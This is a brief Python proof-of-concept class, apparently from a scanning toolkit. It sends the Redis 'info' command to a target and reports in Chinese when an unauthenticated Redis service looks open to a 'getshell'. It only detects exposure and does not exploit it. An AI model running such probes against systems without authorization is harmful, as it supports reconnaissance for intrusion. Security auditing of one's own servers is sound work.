import socket

class POC:
	def __init__(self,target):
		self.target=target

	def verify(self,target):
		payload = '\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'.encode()
		target_ip=target.strip('/').strip('http://').strip('https://').split(':')[0]
		target_port=target.strip('/').strip('http://').strip('https://').split(':')[1]
		s = socket.socket()
		s.settimeout(1)
		try:
			s.connect((target_ip, int(target_port)))
			s.send(payload)
			recvdata = s.recv(1024).decode()
			if 'redis_version' in recvdata:
				print('[+]发现目标可redis getshell------>%s'%target)
			else:
				pass
		except:
			pass
		s.close()
		print('[*]1 poc done')
	def atack(self):
		print('[*]1 poc start')
		self.verify(self.target)
